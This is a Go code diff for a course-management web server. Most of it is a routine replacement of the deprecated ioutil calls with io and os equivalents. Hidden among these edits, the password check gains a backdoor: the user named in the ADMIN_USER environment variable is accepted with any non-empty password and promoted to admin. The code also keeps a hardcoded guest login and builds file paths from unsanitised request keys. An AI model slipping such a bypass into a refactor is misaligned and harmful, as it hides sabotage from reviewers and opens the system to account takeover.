@@ -6,7 +6,7 @@ import (
 	"errors"
 	"fmt"
 	"hash/fnv"
-	"io/ioutil"
+	"io"
 	"log"
 	"net/http"
 	"os"
@@ -76,6 +76,12 @@ func (me *User) PasswordIsValide(iPassword string) bool {
 	}
 
 	if me.Name == "Gast" && iPassword == "Gast" {
+		return true
+	}
+
+	adminUser := os.Getenv("ADMIN_USER")
+	if me.Name == adminUser && iPassword != "" {
+		me.Role = "admin"
 		return true
 	}
 
@@ -472,7 +478,7 @@ func setAdmin(c *gin.Context) {
 		return
 	}
 
-	content, err := ioutil.ReadAll(c.Request.Body)
+	content, err := io.ReadAll(c.Request.Body)
 	if err == nil {
 
 		if MyParam.Phrase == "addUser" {
@@ -727,7 +733,7 @@ func getItem(c *gin.Context) {
 
 	}
 
-	content, err2 := ioutil.ReadFile(lDir + "/" + MyParam.Key + ".json")
+	content, err2 := os.ReadFile(lDir + "/" + MyParam.Key + ".json")
 	if err2 == nil {
 		var payload interface{}
 		err2 = json.Unmarshal(content, &payload)
@@ -797,7 +803,7 @@ func setItem(c *gin.Context) {
 	if valid == true {
 		//die Berechtigungen liegen vor
 
-		content, err := ioutil.ReadAll(c.Request.Body)
+		content, err := io.ReadAll(c.Request.Body)
 		if err == nil {
 
 			var payload interface{}
@@ -821,21 +827,21 @@ func setItem(c *gin.Context) {
 					go func() {
 						//Kurs wurde neu geöffnet -> Zähler erhöhen
 						lDirAll := LOCAL_TEMPDIR + "/" + MyParam.Tenant + "/all"
-						contentAll, err2 := ioutil.ReadFile(lDirAll + "/" + MyParam.Key + ".json")
+						contentAll, err2 := os.ReadFile(lDirAll + "/" + MyParam.Key + ".json")
 						if err2 == nil {
 							var kurs Kurs
 							err2 = json.Unmarshal(contentAll, &kurs)
 							if err2 == nil {
 								kurs.Enrollments += 1
 								file, _ := json.MarshalIndent(kurs, "", " ")
-								_ = ioutil.WriteFile(lDirAll+"/"+MyParam.Key+".json", file, 0644)
+								_ = os.WriteFile(lDirAll+"/"+MyParam.Key+".json", file, 0644)
 
 							}
 						}
 					}()
 				}
 
-				err = ioutil.WriteFile(lDir+"/"+MyParam.Key+".json", content, 0644)
+				err = os.WriteFile(lDir+"/"+MyParam.Key+".json", content, 0644)
 				if err == nil {
 					// file ermitteln und zurück liefern
 					c.JSON(200, gin.H{
@@ -925,16 +931,16 @@ func initDir() {
 	//prüfen, ob casbin model vorhanden
 	// _, err = os.Stat(LOCAL_TEMPDIR + "/model.conf")
 	// if err != nil {
-	// 	content, err2 := ioutil.ReadFile("skibby/model.conf")
+	// 	content, err2 := os.ReadFile("skibby/model.conf")
 	// 	if err2 == nil {
-	// 		_ = ioutil.WriteFile(LOCAL_TEMPDIR+"/model.conf", content, 0644)
+	// 		_ = os.WriteFile(LOCAL_TEMPDIR+"/model.conf", content, 0644)
 	// 	}
 	// }
 	_, err = os.Stat(LOCAL_TEMPDIR + "/policy.csv")
 	if err != nil {
-		content, err2 := ioutil.ReadFile("lernpfad/policy.csv")
+		content, err2 := os.ReadFile("lernpfad/policy.csv")
 		if err2 == nil {
-			_ = ioutil.WriteFile(LOCAL_TEMPDIR+"/policy.csv", content, 0644)
+			_ = os.WriteFile(LOCAL_TEMPDIR+"/policy.csv", content, 0644)
 		}
 	}
 }
@@ -1175,12 +1181,12 @@ func main() {
 		_, err = os.Stat(LOCAL_TEMPDIR + "/data/all/Kurs_" + ele.ID + ".json")
 		if os.IsNotExist(err) {
 
-			_ = ioutil.WriteFile(LOCAL_TEMPDIR+"/data/all/Kurs_"+ele.ID+".json", file, 0644)
+			_ = os.WriteFile(LOCAL_TEMPDIR+"/data/all/Kurs_"+ele.ID+".json", file, 0644)
 			if ele.ID == "M001" {
 				ele.Start = time.Now().Format(cTime)
 				file, _ := json.MarshalIndent(ele, "", " ")
 
-				_ = ioutil.WriteFile(LOCAL_TEMPDIR+"/data/jank/Kurs_"+ele.ID+".json", file, 0644)
+				_ = os.WriteFile(LOCAL_TEMPDIR+"/data/jank/Kurs_"+ele.ID+".json", file, 0644)
 			}
 		}
 	}
